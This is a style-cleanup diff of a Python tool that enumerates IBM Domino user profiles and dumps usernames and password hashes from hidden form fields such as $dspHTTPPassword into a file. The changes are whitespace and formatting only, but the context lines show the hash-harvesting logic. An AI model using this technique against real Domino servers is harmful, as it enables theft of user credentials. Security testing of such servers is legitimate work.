@@ -7,8 +7,8 @@
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
 #
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
 #
 # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -28,6 +28,7 @@ try:
 	requests.packages.urllib3.disable_warnings()
 except:
 	pass
+
 
 # Get user profile URLs
 def enum_accounts(target, username, password, auth):
@@ -88,6 +89,7 @@ def enum_accounts(target, username, password, auth):
 	else:
 		utility.print_warn('No hashes found!')
 
+
 # Asynchronously get accounts
 def async_requests(accounts, username, password):
 	requests = Requests(concurrent=40)
@@ -96,12 +98,13 @@ def async_requests(accounts, username, password):
 	requests.session.verify = False
 
 	try:
-		for account_url in requests.swarm(accounts, maintainOrder=False):	
+		for account_url in requests.swarm(accounts, maintainOrder=False):
 			if account_url.status_code == 200:
 				get_domino_hash(account_url)
 
 	except KeyboardInterrupt:
 		requests.stop(killExecuting=True)
+
 
 # Dump Domino hashes
 def get_domino_hash(response):
@@ -111,7 +114,7 @@ def get_domino_hash(response):
 		# Get account username
 		username_params = ['$dspShortName', '$dspFullName']
 		for user_param in username_params:
-			domino_username = (soup.find('input', attrs={'name':user_param}))['value']
+			domino_username = (soup.find('input', attrs={'name': user_param}))['value']
 			if len(domino_username) > 0:
 				break
 			else:
@@ -120,7 +123,7 @@ def get_domino_hash(response):
 		# Get account hash
 		hash_params = ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']
 		for hash_param in hash_params:
-			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
+			domino_hash = (soup.find('input', attrs={'name': hash_param}))['value']
 			if len(domino_hash) > 0:
 				break
 			else:
@@ -132,6 +135,7 @@ def get_domino_hash(response):
 	if domino_username and domino_hash:
 		print "{0}, {1}".format(domino_username.encode('utf-8'), domino_hash)
 		write_hash(domino_username.encode('utf-8'), domino_hash)
+
 
 # Sort and write hashes to file
 def write_hash(duser, dhash):
